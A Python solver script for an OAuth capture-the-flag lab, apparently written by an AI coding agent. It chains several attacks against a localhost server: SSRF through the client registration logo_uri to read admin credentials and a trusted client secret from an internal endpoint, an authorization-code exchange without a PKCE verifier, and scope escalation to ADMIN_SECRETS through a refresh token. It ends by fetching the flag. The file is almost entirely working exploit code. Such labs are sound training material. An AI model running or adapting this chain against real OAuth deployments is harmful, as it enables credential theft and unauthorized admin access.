#!/usr/bin/env python3
"""
OAuth CTF Advanced - Complete Attack Chain (Simplified)
=========================================

Attack Flow:
1. SSRF via Client Registration → Extract admin credentials + trusted client
2. Login with extracted credentials using trusted client
3. Get Authorization Code
4. PKCE Bypass → Get Access Token & Refresh Token
5. Scope Escalation → Get ADMIN_SECRETS scope
6. FLAG → Access /api/admin/flag

Author: Claude Code
Version: 3.0 (SSRF-only, Pickle RCE removed)
"""

import requests
import re
import json
import time

# Configuration
BASE_URL = 'http://localhost:8080'
RESOURCE_SERVER_URL = f'{BASE_URL}/api'

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_step(step_num, title):
    print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}STEP {step_num}: {title}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")

def print_success(message):
    print(f"{Colors.OKGREEN}[+] {message}{Colors.ENDC}")

def print_info(message):
    print(f"{Colors.OKBLUE}[*] {message}{Colors.ENDC}")

def print_error(message):
    print(f"{Colors.FAIL}[-] {message}{Colors.ENDC}")

def print_warning(message):
    print(f"{Colors.WARNING}[!] {message}{Colors.ENDC}")

def main():
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("="*70)
    print("OAuth CTF Advanced - Complete Attack Chain")
    print("="*70)
    print(f"{Colors.ENDC}")

    # Create session for cookie management
    session = requests.Session()

    # ==================================================
    # STEP 1: SSRF via Client Registration
    # ==================================================
    print_step(1, "SSRF - Extract Admin Credentials + Trusted Client")

    print_info("Discovered OAuth Client Registration endpoint: /oauth/register")
    print_info("Testing SSRF vulnerability with internal URL...")
    print_info(f"SSRF Target: http://auth-server:8000/internal/admin/hint")

    register_data = {
        "client_name": "Attacker Client",
        "redirect_uris": [f"{BASE_URL}/auth/callback"],
        "logo_uri": "http://auth-server:8000/internal/admin/hint"  # SSRF!
    }

    try:
        response = session.post(f"{BASE_URL}/oauth/register", json=register_data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            new_client_id = result.get('client_id')
            new_client_secret = result.get('client_secret')
            logo_fetch_result = result.get('logo_fetch_result', {})

            print_success(f"Client registered: {new_client_id}")
            print_success(f"Client secret: {new_client_secret}")

            # Check SSRF result
            if logo_fetch_result:
                print_success("SSRF successful! Internal endpoint accessed:")
                ssrf_content = logo_fetch_result.get('content', '')
                print(f"\n{Colors.OKCYAN}{ssrf_content}{Colors.ENDC}\n")

                # Parse JSON response
                try:
                    ssrf_data = json.loads(ssrf_content)

                    # Extract admin credentials
                    admin_creds = ssrf_data.get('admin_credentials', {})
                    admin_username = admin_creds.get('username')
                    admin_password = admin_creds.get('password')

                    # Extract trusted client
                    trusted_client = ssrf_data.get('trusted_client', {})
                    trusted_client_id = trusted_client.get('client_id')
                    trusted_client_secret = trusted_client.get('client_secret')

                    if admin_username and admin_password:
                        print_success(f"Admin credentials: {admin_username} / {admin_password}")
                    else:
                        print_error("Could not extract admin credentials from SSRF")
                        return 1

                    if trusted_client_id and trusted_client_secret:
                        print_success(f"Trusted client: {trusted_client_id}")
                        print_success(f"Client secret: {trusted_client_secret}")
                    else:
                        print_error("Could not extract trusted client from SSRF")
                        return 1

                except json.JSONDecodeError:
                    print_error("Failed to parse SSRF response as JSON")
                    return 1
            else:
                print_error("SSRF failed - logo_fetch_result not found")
                return 1
        else:
            print_error(f"Client registration failed: {response.status_code}")
            print_error(f"Response: {response.text[:200]}")
            return 1
    except Exception as e:
        print_error(f"Error during client registration: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 2: Login with Extracted Credentials
    # ==================================================
    print_step(2, "Admin OAuth Login")

    print_info(f"Using credentials: {admin_username} / {admin_password}")
    print_info(f"Using trusted client: {trusted_client_id}")

    login_data = {
        'client_id': trusted_client_id,
        'redirect_uri': f'{BASE_URL}/auth/callback',
        'response_type': 'code',
        'scope': 'read',
        'state': 'attack_state',
        'username': admin_username,
        'password': admin_password,
        'action': 'login'
    }

    try:
        response = session.post(f"{BASE_URL}/oauth/authorize", data=login_data, allow_redirects=False, timeout=10)

        if response.status_code == 302:
            redirect_url = response.headers.get('Location', '')
            print_success(f"Login successful!")

            # Follow redirect
            response2 = session.get(BASE_URL + redirect_url, allow_redirects=False, timeout=10)

            if response2.status_code == 302:
                final_redirect = response2.headers.get('Location', '')

                # Extract authorization code
                code_match = re.search(r'code=([^&]+)', final_redirect)
                if code_match:
                    auth_code = code_match.group(1)
                    print_success(f"Authorization code: {auth_code}")
                else:
                    print_error("Authorization code not found")
                    return 1
            else:
                print_error(f"Expected redirect, got {response2.status_code}")
                return 1
        else:
            print_error(f"Login failed: {response.status_code}")
            return 1
    except Exception as e:
        print_error(f"Error during login: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 3: PKCE Bypass - Token Exchange
    # ==================================================
    print_step(3, "PKCE Bypass - Token Exchange")

    print_info("Exchanging authorization code for tokens...")
    print_warning("PKCE Bypass: Trusted client does not require code_verifier!")

    token_data = {
        'grant_type': 'authorization_code',
        'code': auth_code,
        'client_id': trusted_client_id,
        'client_secret': trusted_client_secret,
        'redirect_uri': f'{BASE_URL}/auth/callback'
        # NO code_verifier! PKCE Bypass for trusted clients!
    }

    try:
        response = requests.post(f"{BASE_URL}/oauth/token", data=token_data, timeout=10)

        if response.status_code == 200:
            tokens = response.json()
            access_token = tokens.get('access_token')
            refresh_token = tokens.get('refresh_token')
            scope = tokens.get('scope', 'unknown')

            print_success("Token exchange successful!")
            print_success(f"Access Token: {access_token[:30]}...")
            print_success(f"Refresh Token: {refresh_token[:30]}...")
            print_success(f"Scope: {scope}")
        else:
            print_error(f"Token exchange failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during token exchange: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 4: Scope Escalation via Refresh Token
    # ==================================================
    print_step(4, "Scope Escalation via Refresh Token")

    print_info("Using refresh token to request ADMIN_SECRETS scope...")
    print_warning("Vulnerability: Refresh token grant accepts any scope without validation!")

    refresh_data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'client_id': trusted_client_id,
        'client_secret': trusted_client_secret,
        'scope': 'ADMIN_SECRETS'  # Escalate!
    }

    try:
        response = requests.post(f"{BASE_URL}/oauth/token", data=refresh_data, timeout=10)

        if response.status_code == 200:
            admin_tokens = response.json()
            admin_access_token = admin_tokens.get('access_token')
            admin_scope = admin_tokens.get('scope', 'unknown')
            admin_access = admin_tokens.get('admin_access', False)

            print_success("Scope escalation successful!")
            print_success(f"New Access Token: {admin_access_token[:30]}...")
            print_success(f"New Scope: {admin_scope}")

            if admin_access:
                print_success("Admin access granted!")
        else:
            print_error(f"Scope escalation failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during scope escalation: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 5: Get FLAG
    # ==================================================
    print_step(5, "Capture the FLAG!")

    print_info("Accessing /api/admin/flag with ADMIN_SECRETS token...")

    headers = {
        'Authorization': f'Bearer {admin_access_token}'
    }

    try:
        response = requests.get(f"{RESOURCE_SERVER_URL}/admin/flag", headers=headers, timeout=10)

        if response.status_code == 200:
            flag_data = response.json()
            flag = flag_data.get('flag', 'FLAG_NOT_FOUND')

            print(f"\n{Colors.BOLD}{Colors.OKGREEN}")
            print("="*70)
            print(f" SUCCESS! FLAG CAPTURED! ")
            print("="*70)
            print(f"FLAG: {flag}")
            print("="*70)
            print(f"{Colors.ENDC}\n")

            print_success("Attack chain completed successfully!")
            return 0
        else:
            print_error(f"Failed to get FLAG: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error accessing FLAG endpoint: {e}")
        return 1

if __name__ == '__main__':
    import sys
    exit_code = main()
    sys.exit(exit_code)
